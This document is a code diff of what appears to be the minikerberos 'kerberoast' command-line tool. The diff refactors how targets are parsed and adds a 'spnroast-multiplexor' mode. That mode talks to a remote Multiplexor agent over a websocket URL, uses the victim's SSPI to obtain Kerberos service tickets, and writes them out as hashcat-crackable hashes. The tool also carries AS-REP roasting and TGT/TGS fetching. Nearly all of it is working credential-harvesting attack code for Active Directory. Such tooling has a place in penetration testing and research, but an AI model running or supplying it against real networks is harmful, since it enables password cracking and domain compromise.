@@ -11,12 +11,14 @@ from msldap import logger as msldaplogger
 
 from minikerberos import logger as kerblogger
 from minikerberos.security import KerberosUserEnum, APREPRoast, Kerberoast
+from msldap.authentication.kerberos.gssapi import get_gssapi, GSSWrapToken, KRB5_MECH_INDEP_TOKEN
 from minikerberos.common.url import KerberosClientURL, kerberos_url_help_epilog
 from minikerberos.common.spn import KerberosSPN
 from minikerberos.common.creds import KerberosCredential
 from minikerberos.common.target import KerberosTarget
 from minikerberos.aioclient import AIOKerberosClient
 from minikerberos.common.utils import TGSTicket2hashcat
+from minikerberos.protocol.asn1_structs import AP_REQ, TGS_REQ
 
 import asyncio
 import ntpath
@@ -25,6 +27,7 @@ import getpass
 import os
 import csv
 import platform
+from urllib.parse import urlparse, parse_qs
 
 kerberoast_epilog = """==== Extra Help ====
 Dump all users from LDAP in a TSV file:
@@ -61,88 +64,173 @@ TGS (get a TGS for given SPN and store it in a CCACHE file):
 For more information on kerberos and LDAP connection string options please consult the README of minikerberos and msldap respectively
 """
 
+async def spnmultiplexor(args):
+	try:
+		from multiplexor.operator.external.sspi import KerberosSSPIClient
+		from multiplexor.operator import MultiplexorOperator
+	except ImportError as error:
+		print('Failed to import multiplexor module! You will need to install multiplexor to get this working!')
 
-async def amain(args):
-	if args.command == 'tgs':
-		ku = KerberosClientURL.from_url(args.kerberos_connection_url)
-		cred = ku.get_creds()
-		target = ku.get_target()
-		spn = KerberosSPN.from_user_email(args.spn)
+	logger = logging.getLogger('websockets')
+	logger.setLevel(100)
+	if args.verbose > 2:
+		logger.setLevel(logging.INFO)
 
+	try:
+		logging.debug('[SPN-MP] input URL: %s' % args.mp_url)
+		url_e = urlparse(args.mp_url)
+		agentid = url_e.path.replace('/','')
+		logging.debug('[SPN-MP] agentid: %s' % agentid)
 
-		kcomm = AIOKerberosClient(cred, target)
-		await kcomm.get_TGT()
-		await kcomm.get_TGS(spn)
+		targets = get_targets_from_file(args)
+		targets += get_target_from_args(args)
+		if len(targets) == 0:
+			raise Exception('No targets were specified! Either use target file or specify target via cmdline')
 		
-		kcomm.ccache.to_file(args.out_file)
-	
-	elif args.command == 'tgt':
-		ku = KerberosClientURL.from_url(args.kerberos_connection_url)
-		cred = ku.get_creds()
-		target = ku.get_target()
+		logging.debug('[SPN-MP] loaded %s targets' % len(targets))
+		operator = MultiplexorOperator(args.mp_url)
+		await operator.connect()
+		#creating virtual sspi server
+		results = []
+		for target in targets:
+			server_info = await operator.start_sspi(agentid)
+			#print(server_info)
+			sspi_url = 'ws://%s:%s' % (server_info['listen_ip'], server_info['listen_port'])
+			#print(sspi_url)
+			ksspi = KerberosSSPIClient(sspi_url)
+			await ksspi.connect()
 
-		kcomm = AIOKerberosClient(cred, target)
-		await kcomm.get_TGT()
-		
-		kcomm.ccache.to_file(args.out_file)
+			apreq, err = await ksspi.authenticate(target.get_formatted_pname())
+			if err is not None:
+				logging.debug('[SPN-MP] error occurred while roasting %s: %s' % (target.get_formatted_pname(), err))
+				continue
+			unwrap = KRB5_MECH_INDEP_TOKEN.from_bytes(apreq)
+			aprep = AP_REQ.load(unwrap.data[2:]).native
+			results.append(TGSTicket2hashcat(aprep))
 
-	elif args.command == 'asreproast':
-		if not args.targets and not args.user:
-			raise Exception('No targets loaded! Either -u or -t MUST be specified!')
-		creds = []
-		if args.targets:
-			with open(args.targets, 'r') as f:
-				for line in f:
-					line = line.strip()
-					domain = None
-					username = None
-					if line.find('@') != -1:
-						#we take for granted that usernames do not have the char / in them!
-						username, domain = line.split('@')
-					else:
-						username = line
+		if args.out_file:
+			with open(args.out_file, 'w') as f:
+				for thash in results:
+					f.write(thash + '\r\n')
 
-					if args.realm:
-						domain = args.realm
-					else:
-						if domain is None:
-							raise Exception('Realm is missing. Either use the -r parameter or store the target users in <realm>/<username> format in the targets file')
+		else:
+			for thash in results:
+				print(thash)
 
-					cred = KerberosCredential()
-					cred.username = username
-					cred.domain = domain
-					creds.append(cred)
+	except Exception as e:
+		logging.exception('[SPN-MP] exception!')
 
-		if args.user:
-			for user in args.user:
+def get_targets_from_file(args, to_spn = True):
+	targets = []
+	if args.targets:
+		with open(args.targets, 'r') as f:
+			for line in f:
+				line = line.strip()
 				domain = None
 				username = None
-				if user.find('@') != -1:
-					#we take for granted that usernames do not have the char / in them!
-					username, domain = user.split('@')
+				if line.find('@') != -1:
+					#we take for granted that usernames do not have the char @ in them!
+					username, domain = line.split('@')
 				else:
-					username = user
-
+					username = line
+				
 				if args.realm:
 					domain = args.realm
 				else:
 					if domain is None:
 						raise Exception('Realm is missing. Either use the -r parameter or store the target users in <realm>/<username> format in the targets file')
-				cred = KerberosCredential()
-				cred.username = username
-				cred.domain = domain
-				creds.append(cred)
+				
+				if to_spn is True:
+					target = KerberosSPN()
+					target.username = username
+					target.domain = domain
+				else:
+					target = KerberosCredential()
+					target.username = username
+					target.domain = domain
+				targets.append(target)
+	return targets
 
-		logging.debug('ASREPRoast loaded %d targets' % len(creds))
+def get_target_from_args(args, to_spn = True):
+	targets = []
+	if args.user:
+		for user in args.user:
+			domain = None
+			username = None
+			if user.find('@') != -1:
+				#we take for granted that usernames do not have the char / in them!
+				username, domain = user.split('@')
+			else:
+				username = user
 
-		logging.debug('ASREPRoast will suppoort the following encryption type: %s' % (str(args.etype)))
+			if args.realm:
+				domain = args.realm
+			else:
+				if domain is None:
+					raise Exception('Realm is missing. Either use the -r parameter or store the target users in <realm>/<username> format in the targets file')
+			if to_spn is True:
+				target = KerberosSPN()
+				target.username = username
+				target.domain = domain
+			else:
+				target = KerberosCredential()
+				target.username = username
+				target.domain = domain
+			targets.append(target)
+	return targets
 
+
+async def amain(args):
+	if args.command == 'tgs':
+		logging.debug('[TGS] started')
+		ku = KerberosClientURL.from_url(args.kerberos_connection_url)
+		cred = ku.get_creds()
+		target = ku.get_target()
+		spn = KerberosSPN.from_user_email(args.spn)
+
+		logging.debug('[TGS] target user: %s' % spn.get_formatted_pname())
+		logging.debug('[TGS] fetching TGT')
+		kcomm = AIOKerberosClient(cred, target)
+		await kcomm.get_TGT()
+		logging.debug('[TGS] fetching TGS')
+		await kcomm.get_TGS(spn)
 		
+		kcomm.ccache.to_file(args.out_file)
+		logging.debug('[TGS] done!')
+
+	elif args.command == 'tgt':
+		logging.debug('[TGT] started')
+		ku = KerberosClientURL.from_url(args.kerberos_connection_url)
+		cred = ku.get_creds()
+		target = ku.get_target()
+
+		logging.debug('[TGT] cred: %s' % cred)
+		logging.debug('[TGT] target: %s' % target)
+
+		kcomm = AIOKerberosClient(cred, target)
+		logging.debug('[TGT] fetching TGT')
+		await kcomm.get_TGT()
+		
+		kcomm.ccache.to_file(args.out_file)
+		logging.debug('[TGT] Done! TGT stored in CCACHE file')
+
+	elif args.command == 'asreproast':
+		if not args.targets and not args.user:
+			raise Exception('No targets loaded! Either -u or -t MUST be specified!')
+		creds = []
+		targets = get_targets_from_file(args, False)
+		targets += get_target_from_args(args, False)
+		if len(targets) == 0:
+			raise Exception('No targets were specified! Either use target file or specify target via cmdline')
+
+		logging.debug('[ASREPRoast] loaded %d targets' % len(targets))
+		logging.debug('[ASREPRoast] will suppoort the following encryption type: %s' % (str(args.etype)))
+
 		ks = KerberosTarget(args.address)
 		ar = APREPRoast(ks)
 		hashes = []
-		for cred in creds:
-			h = await ar.run(cred, override_etype = [args.etype])
+		for target in targets:
+			h = await ar.run(target, override_etype = [args.etype])
 			hashes.append(h)
 
 		if args.out_file:
@@ -159,52 +247,12 @@ async def amain(args):
 	elif args.command == 'spnroast':
 		if not args.targets and not args.user:
 			raise Exception('No targets loaded! Either -u or -t MUST be specified!')
-		targets = []
-		if args.targets:
-			with open(args.targets, 'r') as f:
-				for line in f:
-					line = line.strip()
-					domain = None
-					username = None
-					if line.find('@') != -1:
-						#we take for granted that usernames do not have the char @ in them!
-						username, domain = line.split('@')
-					else:
-						username = line
 
-					if args.realm:
-						domain = args.realm
-					else:
-						if domain is None:
-							raise Exception('Realm is missing. Either use the -r parameter or store the target users in <realm>/<username> format in the targets file')
-
-					target = KerberosSPN()
-					target.username = username
-					target.domain = domain
-					targets.append(target)
-					
-		if args.user:
-			for user in args.user:
-				domain = None
-				username = None
-				if user.find('@') != -1:
-					#we take for granted that usernames do not have the char / in them!
-					username, domain = user.split('@')
-				else:
-					username = user
-
-				if args.realm:
-					domain = args.realm
-				else:
-					if domain is None:
-						raise Exception('Realm is missing. Either use the -r parameter or store the target users in <realm>/<username> format in the targets file')
-				target = KerberosSPN()
-				target.username = username
-				target.domain = domain
-				targets.append(target)
-
+		targets = get_targets_from_file(args)
+		targets += get_target_from_args(args)
 		if len(targets) == 0:
-			raise Exception('No targets loaded!')
+			raise Exception('No targets were specified! Either use target file or specify target via cmdline')
+
 		logging.debug('Kerberoast loaded %d targets' % len(targets))
 
 		if args.etype:
@@ -250,7 +298,7 @@ async def amain(args):
 				if result is True:
 					if args.out_file:
 						with open(args.out_file, 'a') as f:
-							f.write(user + '\r\n')
+							f.write(result + '\r\n')
 					else:
 						print('[+] Enumerated user: %s' % str(spn))
 
@@ -268,52 +316,17 @@ async def amain(args):
 		if not args.targets and not args.user:
 			raise Exception('No targets loaded! Either -u or -t MUST be specified!')
 		
-		targets = []
-		if args.targets:
-			with open(args.targets, 'r') as f:
-				for line in f:
-					line = line.strip()
-					domain = None
-					username = None
-					if line.find('@') != -1:
-						#we take for granted that usernames do not have the char / in them!
-						username, domain = line.split('@')
-					else:
-						username = line
-
-					if args.realm:
-						domain = args.realm
-					else:
-						if domain is None:
-							raise Exception('Realm is missing. Either use the -r parameter or store the target users in <realm>/<username> format in the targets file')
-					
-					spn_name = '%s@%s' % (username, domain)
-					targets.append(spn_name)
-					
-		if args.user:
-			for user in args.user:
-				domain = None
-				username = None
-				if user.find('/') != -1:
-					#we take for granted that usernames do not have the char / in them!
-					username, domain = user.split('/')
-				else:
-					username = user
-
-				if args.realm:
-					domain = args.realm
-				else:
-					if domain is None:
-						raise Exception('Realm is missing. Either use the -r parameter or store the target users in <realm>/<username> format in the targets file')
-				spn_name = '%s@%s' % (username, domain)
-				targets.append(spn_name)
+		targets = get_targets_from_file(args)
+		targets += get_target_from_args(args)
+		if len(targets) == 0:
+			raise Exception('No targets were specified! Either use target file or specify target via cmdline')
 		
 		results = []
 		errors = []
 		for spn_name in targets:
 			ksspi = KerberoastSSPI()
 			try:
-				ticket = ksspi.get_ticket_for_spn(spn_name)
+				ticket = ksspi.get_ticket_for_spn(spn_name.get_formatted_pname())
 			except Exception as e:
 				errors.append((spn_name, e))
 				continue
@@ -333,6 +346,9 @@ async def amain(args):
 
 		logging.info('SSPI based Kerberoast complete')
 
+	elif args.command == 'spnroast-multiplexor':
+		#hiding the import so it's not necessary to install multiplexor
+		await spnmultiplexor(args)
 
 	elif args.command == 'auto':
 		if platform.system() != 'Windows':
@@ -344,7 +360,7 @@ async def amain(args):
 			raise Exception('winsspi module not installed!')
 		
 		domain = args.dc_ip
-		url = 'ldap+sspi://%s' % domain
+		url = 'ldap+sspi-ntlm://%s' % domain
 		msldap_url = MSLDAPURLDecoder(url)
 		client = msldap_url.get_client()
 		await client.connect()
@@ -534,6 +550,15 @@ def main():
 	spnroastsspi_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')
 	spnroastsspi_group.add_argument('-r','--realm', help='Kerberos realm <COMPANY.corp> This overrides realm specification got from the target file, if any')
 	
+	multiplexorsspi_group = subparsers.add_parser('spnroast-multiplexor', help='')
+	multiplexorsspi_group.add_argument('-t','--targets', help='File with a list of usernames to roast, one user per line')
+	multiplexorsspi_group.add_argument('-u','--user',  action='append', help='Target users to roast in <realm>/<username> format or just the <username>, if -r is specified. Can be stacked.')
+	multiplexorsspi_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')
+	multiplexorsspi_group.add_argument('-r','--realm', help='Kerberos realm <COMPANY.corp> This overrides realm specification got from the target file, if any')
+	multiplexorsspi_group.add_argument('mp_url', help='Multiplexor URL in the following format: ws://host:port/agentid or wss://host:port/agentid')
+	
+
+
 	tgt_group = subparsers.add_parser('tgt', help='Fetches a TGT for the given user credential',formatter_class=argparse.RawDescriptionHelpFormatter, epilog = kerberos_url_help_epilog)
 	tgt_group.add_argument('kerberos_connection_url', help='Either CCACHE file name or Kerberos login data in the following format: <domain>/<username>/<secret_type>:<secret>@<dc_ip_or_hostname>')
 	tgt_group.add_argument('out_file',  help='Output CCACHE file')
